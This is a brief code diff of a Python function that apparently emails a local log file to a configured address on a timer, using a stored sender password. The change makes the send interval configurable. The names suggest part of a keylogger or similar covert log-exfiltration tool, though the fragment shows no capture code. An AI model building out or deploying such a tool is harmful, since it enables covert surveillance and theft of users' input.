@@ -119,7 +119,7 @@ def send_log():
     global dst_email, src_mail, password, interval, cert_path
     log_path = './log.txt'
 
-    threading.Timer(int(10), send_log).start()
+    threading.Timer(interval, send_log).start()
     if not os.path.exists("log.txt"):
         return
     if not os.path.exists(cert_path):
